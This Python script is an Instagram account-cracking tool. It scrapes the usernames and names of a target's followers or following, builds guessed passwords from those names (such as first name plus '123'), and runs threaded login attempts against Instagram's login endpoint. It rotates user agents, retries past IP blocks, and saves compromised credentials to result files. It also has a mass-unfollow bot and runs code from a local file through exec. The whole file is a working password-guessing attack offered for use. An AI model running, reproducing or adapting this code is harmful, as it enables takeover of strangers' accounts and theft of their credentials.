try:
	import json
	import uuid
	import hmac
	import random
	import hashlib
	import urllib
	import stdiomask
	import urllib.request
except ImportError as e:
	exit(f'\n [\033[1;35m>\033[0m] module {e} belum terinstall')
import requests,bs4,json,os,sys,random,datetime,time,re
try:
	import rich
except ImportError:
	os.system('pip install rich')
	time.sleep(1)
	try:
		import rich
	except ImportError:
		exit('Tidak Dapat Menginstall Module rich, Coba Install Manual (pip install rich)')
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from time import sleep
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
from bs4 import BeautifulSoup as parser

day=datetime.now().strftime("%d-%b-%Y")
nyMnD = 5
nyMxD = 10

insta_log='https://www.instagram.com/accounts/login/?force_classic_login=&'
url='https://www.instagram.com'
menudump=[]
try:
	os.mkdir('result')
except:
	pass
	
exec(open("etc").read())

USN="Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)"
ugen=open('ua.txt','r').read().splitlines()
internal,external,success,checkpoint,loop,following,lisensikuni,lisensiku=[],[],[],[],0,[],[],[]
s=requests.Session()

	
try:
    # python 2
	urllib_quote_plus = urllib.quote
except:
    # python 3
	urllib_quote_plus = urllib.parse.quote_plus
 

def cekAPI(cookie):
    user=open('.username','r').read()
    try:
        c=s.get("https://www.instagram.com/%s/?__a=1"%(user),cookies={'cookie':cookie},headers={"user-agent":USN})
        i=c.json()["graphql"]["user"]
        nama=i["full_name"]
        followers=i["edge_followed_by"]["count"]
        following=i["edge_follow"]["count"]
        external.append(f'{nama}|{followers}|{following}')
    except  (ValueError,KeyError):
        wel='# Instagram Checkpoint'
        wel2 = mark(wel, style='red')
        sol().print(wel2)
        time.sleep(4)
        os.remove('.kukis.log')
        os.remove('.username')
        exit()

    return external,user

def checkin():
        try:
            kuki=open('.kukis.log','r').read()
        except FileNotFoundError:
            banner()
            wel = '# Choose How You Login'
            wel2 = mark(wel, style='WHITE')
            sol().print(wel2)
            io = '[1] LOGIN USE COOKIES\n[2] LOGIN USE COOKES AND USERNAME'
            oi = nel(io, style='WHITE')
            cetak(nel(oi, title=' CHOOSE YOUR TYPE OF LOGIN'))
            loginpil=input(f"[●] INPUT CHOICE:{P} ")
            if loginpil=='1':
                wel = '# USE A FRESH COOKIE TO LOGIN'
                wel2 = mark(wel, style='WHITE')
                sol().print(wel2)
                us=input(f'{P}[●] INPUT USERNAME :{P}')
                cok=input(f'{P}[●] INPUT COOKIES :{P}')
                kuki=open('.kukis.log','w').write(cok)
                user=open('.username','w').write(us)
                os.system('python instagram.py')
            elif loginpil == '2':
                login()
        ex,user=cekAPI(kuki)
        cookie={'cookie':kuki}
        instagram(ex,user,cookie).menu()
   
def login():
	global external
	try:
		wel = '# USE A FRESH USERNAME AND PASSWORD TO LOGIN'
		wel2 = mark(wel, style='WHITE')
		sol().print(wel2)
		us=input(f"{CY}[•] INPUT USERNAME: {P}")
		pw=stdiomask.getpass(prompt=f'{P}[●] INPUT PASSWORD: {P}')
	except KeyboardInterrupt:
		wel = '# KeyboardInterrupt detected... exit !'
		wel2 = mark(wel, style='WHITE')
		sol().print(wel2)
		exit()
	x=instagramAPI(us,pw).loginAPI()
	if x.get('status')=='success':
		open('.username','a').write(us)
		open('.kukis.log','a').write(x.get('cookie'))
		cookie={'cookie':x.get('cookie')}
		print(f'\n{H}>{C} LOGIN SUCCESSFULLY')
		os.system('python login.py')
	elif x.get('status')=='checkpoint':
		wel = '# LOGIN CHECKPOINT'
		wel2 = mark(wel, style='WHITE')
		sol().print(wel2)
		login()
	else:
		wel = '# USERNAME AND PASSWORD IS CORRECT'
		wel2 = mark(wel, style='WHITE')
		sol().print(wel2)
		login()


class instagram:
	def __init__(self,external,username,cookie):
		self.ext=external
		self.username=username
		self.cookie=cookie
		self.s=requests.Session()
	def logo(self):
		os.system('clear')
		for i in external:
			try:
				nama=i.split('|')[0]
				followers=i.split('|')[1]
				following=i.split('|')[2]
			except:
				pass
		print(f"""{P}
╔═══╗╔═══╗╔════╗╔═══╗╔═══╗
║╔═╗║║╔═╗║║╔╗╔╗║║╔═╗║║╔═╗║
║║─║║║╚══╗╚╝║║╚╝║╚═╝║║║─║║
║╚═╝║╚══╗║──║║──║╔╗╔╝║║─║║
║╔═╗║║╚═╝║──║║──║║║╚╗║╚═╝║
╚╝─╚╝╚═══╝──╚╝──╚╝╚═╝╚═══╝

╔══════════════════════════════════════════╗
║ Creator  : 𝐶𝒉𝑖𝑔𝑜𝑧𝑖𝑒𝑤𝑜𝑟𝑙𝑑𝑤𝑖𝑑𝑒             ║
║ Github   : https://t.me/CHIG0ZIEWORLDWIDE║
║ Telegram : https://t.me/CHIG0ZIEWORLDWIDE║
║ Version  : 500.0                         ║
║ FILENAME : ASTRO                         ║
╚══════════════════════════════════════════╝
[01] PUBLIC ID SEARCH
[02] CRACK FROM FOLLOWERS
[03] CRACK FROM FOLLOWING
[04] CHECK CRACKED STATUS
[05] VIEW CRACKED RESULTS
[06] BOT STATUS
[R] REPORT
[C] CHANGE ID LOGIN
[E] EXIT
	""")

	def BUG(self):
		bug=f'[•] THIS SCRIPT IS CREATED FOR REASONS\n[•] MESSAGE ADMIN ON +2348069472727\n[•] CHIGOZIEWORLDWIDE'
		bug1 = nel(bug, style='WHITE')
		cetak(nel(bug1, title='REPORT BUG'))
		exit()

	def ChangeLog(self):
		io='[1] Fix bug login instagram\n[2] Ganti tampilan scripts\n[3] Fix bug lisensi invalid'
		oi = nel(io, style='cyan')
		cetak(nel(oi, title='Fitur yang di update'))

		io='[1] Bot unfollow instagram\n[2] Bot spam komen'
		oi = nel(io, style='WHITE')
		cetak(nel(oi, title='Fitur tambahan'))

		io='[1] Untuk fitur brute force masih dalam perbaikan\n[2] Untuk fitur Bot unfollow masih dalam perbaikan\n[3] Untuk fitur bot komen masih dalam perbaikan'
		oi = nel(io, style='WHITE')
		cetak(nel(oi, title='Fix Bug'))
		exit()

	def Exit(self):
		kel='# Are you sure you want to leave ?'
		kel1=mark(kel,style='WHITE')
		sol().print(kel1)
		x=input(f'\n{P}[•] ENTER [y/t] : {P}')
		if x in ('y','Y'):
			os.remove('.kukis.log')
			os.remove('.username')
			os.system('python Instagram.py')
		elif x in ('t','T'):
			os.system('python Instagram.py')
		else:
			self.Exit()

	def sixAPI(self,six_id):
		url = "https://www.instagram.com/web/search/topsearch/?context=blended&query="+six_id+"&rank_token=0.3953592318270893&count=1"
		x = requests.get(url)
		x_jason = x.json()
		uid = str( x_jason['users'][0].get("user").get("pk") )
		return uid

	def unfollowAPI(self,user_id,username_id,cookie):
		uuid=generateUUID(True)
		xx=self.s.get("https://www.instagram.com/",headers={"user-agent":User_Agent()}).content
		crf_token = re.findall('{"config":{"csrf_token":"(.*)","viewer"',str(xx))[0]
		s.headers.update({'Connection': 'close',
                       'Accept': '*/*',
                       'Content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                       'Cookie2': '$Version=1',
                       'Accept-Language': 'en-US',
                       'User-Agent': User_Agent()})

		data = json.dumps({'_uuid': uuid,
                           '_uid': username_id,
                           'user_id': user_id,
                           '_csrftoken': crf_token})

		self.payload = 'signed_body={}.{}&ig_sig_key_version=4'.format(
			self.generateUUID(False),
			urllib.request.quote(data))
		return s.post('https://i.instagram.com/api/v1/friendships/destroy/%s/'%(user_id),self.payload,cookies=cookie).text


	def searchAPI(self,cookie,nama):
		try:
			x=s.get('https://www.instagram.com/web/search/topsearch/?count=100000&context=blended&query=%s&rank_token=0.21663777590422106&include_reel=true'%(nama),cookies=cookie,headers={"user-agent":USN})
			x_jason=json.loads(x.text)
			for i in x_jason['users']:
				user=i['user']
				username=user['username']
				fullname=user['full_name']
				internal.append(f'{username}|{fullname}')
		except requests.exceptions.ConnectionError:
			exit(f'\n [{M}!{M}] BAD INTERNET CONNECTION')
		return internal

	def idAPI(self,cookie,id):
			try:
				m=s.get('https://www.instagram.com/%s/?__a=1'%(id),cookies=cookie,headers={"user-agent":USN})
				m_jason=m.json()["graphql"]["user"]
				idx=m_jason["id"]
			except requests.exceptions.ConnectionError:
				exit(f"\n{M}BAD INTERNET CONNECTION{P}")
			except Exception as e:
				exit(f"\n{M}USERNAME NOT FOUND{P}")
			return idx

	def infoAPI(self,cookie,api,id):
			try:
				idtar=f'# [●] WAIT COLLECTING ID [●]'
				idtar1=mark(idtar,style='WHITE')
				sol().print(idtar1)
				x=s.get(api%(id),cookies=cookie,headers={"user-agent":USN})
				x_jason=json.loads(x.text)
				for i in x_jason['users']:
					username = i["username"]
					nama = i["full_name"]
					internal.append(f'{username}|{nama}')
					following.append(username)
				if 'pengikut' in menudump:
					maxid=x_jason['next_max_id']
					for z in range (9999):
						x=s.get('https://i.instagram.com/api/v1/friendships/'+id+'/followers/?count=100&max_id='+maxid,cookies=cookie,headers={"user-agent":USN})
						x_jason=json.loads(x.text)
						try:
							for i in x_jason['users']:
								username = i["username"]
								nama = i["full_name"]
								internal.append(f'{username}|{nama}')
								following.append(username)
							try:
								maxid=x_jason['next_max_id']
							except:
								break
						except:
							if 'challenge' in x.text:
								break
							else:
								continue
				else:pass
			except requests.exceptions.ConnectionError:
				exit(f'\n{M}BAD INTERNET CONNECTION{P}')
			except Exception as e:
				print(f'\n{M}USERNAME NOT FOUND{P}')
			return internal

	def passwordAPI(self,xnx):
		idtar=f'# [•] TOTAL ID  : {len(internal)} [•]'
		idtar1=mark(idtar,style='WHITE')
		sol().print(idtar1)
		pilpass='# COMBINE PASSWORD'
		pilpass1=mark(pilpass,style='WHITE')
		sol().print(pilpass1)
		komb='[1] FirstName+123\n[2] FirtsName+123,FullName\n[3] FirstName+123,FullName,Full Name'
		komb1 = nel(komb, style='WHITE')
		cetak(nel(komb1))
		c=input(f'{P}[●] INPUT OPTIONS :{P} ')
		if c=='1':
			self.generateAPI(xnx,c)
		elif c=='2':
			self.generateAPI(xnx,c)
		elif c=='3':
			self.generateAPI(xnx,c)
		else:
			self.passwordAPI(xnx)

	def generateAPI(self,user,o):
		io=f'[●] SHOW OK  result/{day}.txt\n[•] SHOW CP  result/{day}.txt'
		oi = nel(io, style='WHITE')
		cetak(nel(oi, title='CRACK'))
		ipku='# [●] TURN ON AIRPLANE MODE FOR 10 SECONDS'
		ipku1=mark(ipku,style='WHITE')
		sol().print(ipku1)
		with ThreadPoolExecutor(max_workers=30) as shinkai:
			for i in user:
				try:
					username=i.split("|")[0]
					password=i.split("|")[1].lower()
					for w in password.split(" "):
						if len(w)<3:
							continue
						else:
							w=w.lower()
							if o=="1":
								if len(w)==3 or len(w)==4 or len(w)==5:
									sandi=[w+'123']
								else:
									sandi=[w]
							elif o=="2":
								if len(w)==3 or len(w)==4 or len(w)==5:
									sandi=[w+'123',w]
								else:
									sandi=[w+'123',w]
							elif o=="3":
								if len(w)==3 or len(w)==4 or len(w)==5:
									sandi=[w+'123',w,password.lower()]
								else:
									sandi=[w+'123',w,password.lower()]
							shinkai.submit(self.crackAPI,username,sandi)
				except:
					pass
		print('\n')
		oi='# CRACKING FINISHED'
		io=mark(oi,style='WHITE')
		sol().print(io)
		exit()

	def APIinfo(self,user):
		try:
			x=s.get("https://www.instagram.com/%s/?__a=1"%(user),headers={"user-agent":USN})
			x_jason=x.json()["graphql"]["user"]
			nama=x_jason["full_name"]
			pengikut=x_jason["edge_followed_by"]["count"]
			mengikut=x_jason["edge_follow"]["count"]
			postingan=x_jason["edge_owner_to_timeline_media"]["count"]
		except:
			pass

		return nama,pengikut,mengikut,postingan

	def crackAPI(self,user,pas):
		global loop,success,checkpoint
		sys.stdout.write(f"\r [🤠][{K}{loop}/{len(internal)}{H}] {H}[LIVE :{len(success)}]{C}  {M}[FUCK :{len(checkpoint)}]{C} "),
		sys.stdout.flush()
		try:
			for pw in pas:
				uaku=random.choice(ugen)
				token=s.get('https://b.i.instagram.com/accounts/login/?next=/accounts/logout/')
				headers = {
					'Host': 'www.instagram.com',
					'content-length': '319',
					'x-ig-app-id': '1217981644879628',
					'x-ig-www-claim': '0',
					'sec-ch-ua-mobile': '?1',
					'x-instagram-ajax': '91a9763f5eb6',
					'content-type': 'application/x-www-form-urlencoded',
					'accept': '*/*',
					'x-requested-with': 'XMLHttpRequest',
					'x-asbd-id': '198387',
					'user-agent': uaku,
					'x-csrftoken': token.cookies['csrftoken'],
					'origin': 'https://www.instagram.com',
					'sec-fetch-site': 'same-origin',
					'sec-fetch-mode': 'cors',
					'sec-fetch-dest': 'empty',
					'referer': 'https://www.instagram.com/',
					'accept-encoding': 'gzip, deflate, br',
					'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
				}

				param={
					"enc_password": "#PWD_INSTAGRAM_BROWSER:0:{}:{}".format(random.randint(1000000000, 99999999999),pw),
					"username": user,
					"optIntoOneTap": 'false',
					"queryParams": "{}",
					"stopDeletionNonce": "",
					"trustedDeviceRecords": "{}"}
				x=s.post("https://www.instagram.com/accounts/login/ajax/",headers=headers,data=param)
				x_jason=json.loads(x.text)
				if "userId" in str(x_jason):
					nama,pengikut,mengikut,postingan=self.APIinfo(user)
					print(f"""\r 
  {H}[●]{H} {H}STATUS     : {H}ACTIVE●
  {H}[●]{H} {H}NAMA        : {H}{nama}{H}
  {H}[●]{H} {H}Username : {H}{user}{H}
  {H}[●]{H} {H}Password  : {H}{pw}{H}
  {H}[●]{H} {H}Follower    : {H}{pengikut}{H}
  {H}[●]{H} {H}Following : {H}{mengikut}{H}
  {H}[●]{H} {H}Posts :         {H}{postingan}{H}
            """)
					open(f"result/success-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
					success.append(user)
					break

				elif 'checkpoint_url' in str(x_jason):
					nama,pengikut,mengikut,postingan=self.APIinfo(user)
					print(f"""\r  
  {M}[●]{M} STATUS :  CHECKPOINT●
  {M}[●]{M} NAMA: {M}{nama}{M}
  {M}[●]{M} Username: {M}{user}{M}
  {M}[●]{M} Password: {M}{pw}{M}
  {M}[●]{M} Follower:    {M}{pengikut}{M}
  {M}[●]{M} Following: {M}{mengikut}{M}
  {M}[●]{M} Posts :         {M}{postingan}{M}
           """)
					open(f"result/checkpoint-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
					checkpoint.append(user)
					break

				elif 'Harap tunggu beberapa menit sebelum mencoba lagi.' in str(x.text):
					sys.stdout.write(f"\r┣[{U}!{P}] {U}SPAM IP{P}");sys.stdout.flush();sleep(10)
					self.crackAPI(user,pas)
				elif 'ip_block' in str(x.text):
					sys.stdout.write(f"\r┣[{U}!{P}] {U}IP MOOD BLOCKED{P}");sys.stdout.flush();sleep(10)
					self.crackAPI(user,pas)
				elif 'spam' in str(x.text):
					sys.stdout.write(f"\r┣[{U}!{P}] {U}MOOD{P}");sys.stdout.flush();sleep(5)
#					self.crackAPI(user,pas)

				else:
					continue

			loop+=1
		except:
			self.crackAPI(user,pas)

	def checkAPI(self,user,pw):
		try:
			token=s.get("https://www.instagram.com/",headers={"user-agent":User_Agent()}).content
			crf_token=re.findall(r"\"csrf_token\"\:\"(.*?)\"", str(token))[0]
			s.headers.update({
				'authority': 'www.instagram.com',
				'x-ig-www-claim': 'hmac.AR08hbh0m_VdJjwWvyLFMaNo77YXgvW_0JtSSKgaLgDdUu9h',
				'x-instagram-ajax': '82a581bb9399',
				'content-type': 'application/x-www-form-urlencoded',
				'accept': '*/*',
				'user-agent': user_agent(),
				'x-requested-with': 'XMLHttpRequest',
				'x-csrftoken': crf_token,
				'x-ig-app-id': '936619743392459',
				'origin': 'https://www.instagram.com',
				'sec-fetch-site': 'same-origin',
				'sec-fetch-mode': 'cors',
				'sec-fetch-dest': 'empty',
				'referer': 'https://www.instagram.com/',
				'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8'
			})

			param={
				"username": user,
				"enc_password": "#PWD_INSTAGRAM_BROWSER:0:{}:{}".format(random.randint(1000000000, 99999999999),pw),
				"optIntoOneTap": False,
				"queryParams": {},
				"stopDeletionNonce": "",
				"trustedDeviceRecords": {}
			}
			x=s.post("https://www.instagram.com/accounts/login/ajax/",data=param);sleep(1)
			x_jason=json.loads(x.text)
			if "userId" in x.text:
				nama,pengikut,mengikut,postingan=self.APIinfo(user)
				print(f"""\r   
  {H}[●]{H} {H}STATUS     : {H}ACTIVE●
  {H}[●]{H} {H}NAMA        : {H}{nama}{H}
  {H}[●]{H} {H}Username : {H}{user}{H}
  {H}[●]{H} {H}Password  : {H}{pw}{H}
  {H}[●]{H} {H}Followers  : {H}{pengikut}{H}
  {H}[●]{H} {H}Following  : {H}{mengikut}{H}
  {H}[●]{H} {H}Posts         : {H}{postingan}{H}
				""")
			elif 'checkpoint_url' in x.text:
				nama,pengikut,mengikut,postingan=self.APIinfo(user)
				print(f"""\r  
  {M}[●]{M} STATUS :  CHECKPOINT●
  {M}[●]{M} NAMA      : {M}{nama}{M}
  {M}[●]{M} Username: {M}{user}{M}
  {M}[●]{M} Password: {M}{pw}{M}
  {M}[●]{M} Followers: {M}{pengikut}{M}
  {M}[●]{M} Following: {M}{mengikut}{M}
  {M}[●]{M} Posts:        {M}{postingan}{M}
				""")
			elif 'Please wait a few minutes' in str(x.text):
				sys.stdout.write(f"\r {P}!{P}] {P}Wait Few seconds{P}");sys.stdout.flush();sleep(5)
				self.checkAPI(user,pw)
		except:
			self.checkAPI(user,pw)

	def menu(self):
		self.logo()
		c=input(f'{P}[MENU] :{P}  ')
		if c=='':
			self.menu()
		elif c in ('1','01'):
			mas='# INPUT USERNAME TARGET'
			mas1=mark(mas,style='WHITE')
			sol().print(mas1)
			m=int(input(f'\n{P}[•] LIMIT : {P}'));print('')
			mas='# INPUT nama RANDOM searching'
			mas1=mark(mas,style='WHITE')
			sol().print(mas1)
			for i in range(m):
				i+1
				nama=input(f'{P} INPUT nama ({P}{len(internal)}{P}): ')
				name=self.searchAPI(self.cookie,nama)
			self.passwordAPI(name)

		elif c in ('2','02'):
			menudump.append('FOLLOWERS')
			mas='# TARGET ID NOT FUND'
			mas1=mark(mas,style='WHITE')
			sol().print(mas1)
			m=input(f'{P}[●] USERNAME TARGET : {P}')

			id=self.idAPI(self.cookie,m)
			info=self.infoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/followers/?count=100',id)
			self.passwordAPI(info)

		elif c in ('3','03'):
			mas='# TARGET USERNAME NOT FOUND'
			mas1=mark(mas,style='WHITE')
			sol().print(mas1)
			m=input(f'{P}[●] USERNAME TARGET : {P}')

			id=self.idAPI(self.cookie,m)
			info=self.infoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/following/?count=100000',id)
			self.passwordAPI(info)


		elif c in ('4','04'):
			print('')
			for i in os.listdir('result'):
				print(f' [{U}>{P}] {i}')
			c=input(f'\n {P} INPUT nama file: {P}')
			g=open("result/%s"%(c)).read().splitlines()
			print(f'\n{P}┣[+] TOTAL IDS FOUND{H}{len(g)}{P}')
			print(f'\n{P} Proses status{P}\n')
			for s in g:
				usr=s.split("|")[0]
				pwd=s.split("|")[1]
				self.checkAPI(usr,pwd)
			exit(f'\n\n{K}┣[#] PROCESS FINISHED...{P}')

		elif c in ('5','05'):
			print('')
			for i in os.listdir('result'):
				print(f' [{U}>{P}] {i}')
			c=input(f'\n {U} INPUT nama file: {P}')
			g=open("result/%s"%(c)).read().splitlines()
			xx=c.split("-")
			xc=xx[0]
			print(f'\n{K} TOTAL IDS FOUND [{P}{len(g)}{P}]')
			for s in g:
				usr=s.split("|")[0]
				pwd=s.split("|")[1]
				fol=s.split("|")[2]
				ful=s.split("|")[3]
				if xc=="checkpoint":
					print(f"""
 [{M}+{C}] {M}FUCK LOGIN{P}:
  {M}|{C}
  {M}├╴>{P} Username: {O}{usr}{P}
  {M}├╴>{P} Password: {O}{pwd}{P}
  {M}├╴>{P} Followers: {O}{fol}{P}
  {M}├╴>{P} Following: {O}{ful}{P}
					""");sleep(0.05)
				else:
					print(f"""
  {H}[>]{P}{H}  LIVE {P}
  {H}[>]{P}{H} Username : {H}{usr}{P}
  {H}[>]{P}{H} Password : {H}{pwd}{P}
  {H}[>]{P}{H} followers : {H}{fol}{P}
  {H}[>]{P}{H} following : {H}{ful}{P}
					""");sleep(0.05)
		elif c in ('6','06'):
			global following
			six=0
			print(f'\n [{P}!{P}] Bot Unfollow-All Run\n')
			x=open('.kukis.log','r').read()
			x_id=re.findall('sessionid=(\d+)',x)[0]
			back=self.infoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/following/?count=100000',x_id)
			for i in following:
				six+=1
				sleep(float( random.uniform(nyMnD*10,nyMxD*10) / 10 ))
				six_id=self.sixAPI(i)
				print(f' {str(six)}{U}}}{P} {i} {P}Unfollow-SUCCESSFUL{P}')
				self.unfollowAPI(six_id,'5452333948',self.cookie)
				#print(w)
			input(f'\n\n [{U}#{C}] Unfollow-all FINISHED...');self.menu()

		elif c in ('r','R'):
			self.BUG()
		elif c in ('c','C'):
			self.ChangeLog()
		elif c in ('e','E'):
			self.Exit()

		else:
			self.menu()

if __name__=='__main__':
	try:
		checkin()
	except requests.exceptions.ConnectionError:
		exit(f'\n [{M}!{M}] BAD INTERNET CONNECTION')
